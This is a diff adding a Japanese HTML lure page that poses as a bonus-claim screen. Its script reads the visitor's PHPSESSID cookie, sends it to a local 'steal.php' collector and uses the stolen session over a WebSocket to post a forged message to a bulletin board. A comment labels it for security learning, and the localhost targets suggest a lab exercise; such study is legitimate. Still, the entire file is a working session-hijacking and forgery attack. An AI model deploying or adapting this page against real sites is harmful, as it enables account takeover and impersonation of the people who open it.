@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>ボーナス受取</title>
+</head>
+<body>
+  <h1>おめでとうございます！</h1>
+  <p>ボーナスの受け取り処理中です...</p>
+
+  <script>
+    // === セキュリティ学習目的でのみ使用してください ===
+
+    // 1. Cookie から PHPSESSID を取り出す関数
+    function getSessionIdFromCookie() {
+      const cookies = document.cookie.split(';');
+      for (const cookie of cookies) {
+        const [name, value] = cookie.trim().split('=');
+        if (name === 'PHPSESSID') {
+          return value;
+        }
+      }
+      return null;
+    }
+
+    const sessionId = getSessionIdFromCookie();
+
+    if (sessionId) {
+      // 2. セッションIDを盗むリクエスト
+      fetch('http://localhost:4010/steal.php?session=' + encodeURIComponent(sessionId));
+
+      // 3. WebSocketを使って掲示板に偽投稿
+      const socket = new WebSocket("ws://localhost:7010");
+
+      socket.onopen = function(e) {
+        console.log("接続確立！");
+
+        const maliciousData = {
+          'user_name': 'attacker',
+          'content': '悪意のあるメッセージ！',
+          'created_at': new Date().toISOString(),
+          'type': 'message',
+          'session_id': sessionId // ← ここに代入
+        };
+
+        socket.send(JSON.stringify(maliciousData));
+      };
+    } else {
+      console.log("PHPSESSID が取得できませんでした");
+    }
+  </script>
+</body>
+</html>
